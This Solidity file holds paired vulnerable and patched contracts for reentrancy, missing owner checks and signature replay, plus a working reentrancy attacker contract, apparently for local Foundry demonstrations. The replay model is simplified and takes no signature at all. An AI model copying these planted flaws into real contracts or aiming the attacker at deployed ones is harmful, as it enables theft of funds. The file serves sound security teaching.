// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title Historical corpus: vulnerable and patched Solidity models
/// @notice Local, self-contained reproductions of three real, publicly-disclosed
///         vulnerability classes. Each pair differs by exactly the defence, so the
///         Foundry PoC (test/) proves causation: the exploit succeeds on the
///         vulnerable contract and reverts on the patched one.
///
/// These are faithful *models* of the mechanisms, not the original protocol
/// source (which is third-party and not vendored here). The point is the
/// executable control: an exploit that runs against real EVM semantics, and a
/// patched version that rejects it. No network, no fork, no real funds.

// --------------------------------------------------------------------------- //
// 1. Reentrancy (The DAO class) -- the withdraw path pays out before it records
//    the debit, so a re-entrant recipient is paid twice.
// --------------------------------------------------------------------------- //

contract VulnerableBank {
    mapping(address => uint256) public balanceOf;
    uint256 public totalDeposits;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    /// @dev Vulnerable: sends the ether before zeroing the balance.
    function withdraw() external {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "nothing to withdraw");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
        balanceOf[msg.sender] = 0;
        totalDeposits -= amount;
    }

    receive() external payable {}
}

contract SafeBank {
    mapping(address => uint256) public balanceOf;
    uint256 public totalDeposits;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    /// @dev Patched: checks-effects-interactions -- the debit is recorded first.
    function withdraw() external {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "nothing to withdraw");
        balanceOf[msg.sender] = 0;
        totalDeposits -= amount;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
    }

    receive() external payable {}
}

contract ReentrancyAttacker {
    VulnerableBank public bank;

    constructor(VulnerableBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}

contract SafeBankAttacker {
    SafeBank public bank;

    constructor(SafeBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        // The re-entry withdraws a now-zero balance and reverts, so the whole
        // attack transaction reverts -- the patched contract rejects the exploit.
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}

// --------------------------------------------------------------------------- //
// 2. Access control (Parity class) -- an ungated privileged setter.
// --------------------------------------------------------------------------- //

contract VulnerableRegistry {
    address public owner;
    uint256 public protectedValue;

    constructor() {
        owner = msg.sender;
        protectedValue = 1000;
    }

    /// @dev Vulnerable: no owner check.
    function setProtectedValue(uint256 v) external {
        protectedValue = v;
    }

    function setOwner(address who) external {
        owner = who;
    }
}

contract SafeRegistry {
    address public owner;
    uint256 public protectedValue;

    constructor() {
        owner = msg.sender;
        protectedValue = 1000;
    }

    /// @dev Patched: only the owner may change protected state.
    function setProtectedValue(uint256 v) external {
        require(msg.sender == owner, "not owner");
        protectedValue = v;
    }

    function setOwner(address who) external {
        require(msg.sender == owner, "not owner");
        owner = who;
    }
}

// --------------------------------------------------------------------------- //
// 3. Signature replay (ERC-2612 class) -- a signed authorization with no
//    single-use nonce can be replayed.
// --------------------------------------------------------------------------- //

contract VulnerablePermit {
    mapping(address => uint256) public allowance;
    mapping(bytes32 => bool) public used;

    /// @dev Vulnerable: the signature is never marked used, so it replays.
    function permit(address owner_, address spender, uint256 amount) external {
        allowance[spender] += amount;
        // `owner_` is trusted here as the signer (the real flaw: no nonce binding).
        owner_;
    }
}

contract SafePermit {
    mapping(address => uint256) public allowance;
    mapping(bytes32 => bool) public used;

    /// @dev Patched: a per-signature single-use flag rejects the replay.
    function permit(address owner_, address spender, uint256 amount, bytes32 sigHash) external {
        require(!used[sigHash], "signature already used");
        used[sigHash] = true;
        allowance[spender] += amount;
        owner_;
    }
}
